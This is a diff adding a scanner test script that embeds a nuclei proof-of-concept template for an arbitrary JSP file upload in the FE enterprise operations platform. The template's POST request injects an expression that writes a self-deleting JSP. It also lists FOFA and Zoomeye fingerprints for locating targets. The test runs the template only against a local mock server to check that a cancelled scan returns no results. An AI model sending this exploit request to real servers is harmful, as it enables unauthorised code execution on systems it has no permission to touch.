@@ -1,0 +1,57 @@
+pocTpl = `# Add your nuclei formatted PoC!
+id: fe-common-sort-tree-fileupload
+
+info:
+  name: 飞企互联-FE企业运营管理平台-common-sort-tree-jsp-任意文件上传
+  author: rain
+  severity: high
+  metadata:
+    fofa: app="飞企互联-FE企业运营管理平台"
+    Zoomeye: 'iconhash: "e90223165de1b1c7ae95336f10c3fe5d"'
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+http:
+  - raw:
+    - |
+        POST /common/common_sort_tree.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        rootName={%25Thread.@fe.util.FileUtil@saveFileContext(new%20java.io.File("../web/fe.war/{{filename}}.jsp"),new%20sun.misc.BASE64Decoder().decodeBuffer("{{base64("<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")}}"))%25}
+
+    - |
+        GET /{{filename}}.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_2,"12321")
+
+`
+
+host, port = tcp.MockServe(`HTTP/1.1 200 Ok
+Content-Length: 5
+
+12321`)
+
+target = f`${host}:${port}`
+
+ctx, cancel = context.WithCancel(context.Background())
+cancel()
+
+result = nuclei.Scan(target, nuclei.rawTemplate(pocTpl), nuclei.context(ctx))~
+count := 0
+for r in result {
+count++
+}
+
+dump(count)
+assert count == 0;
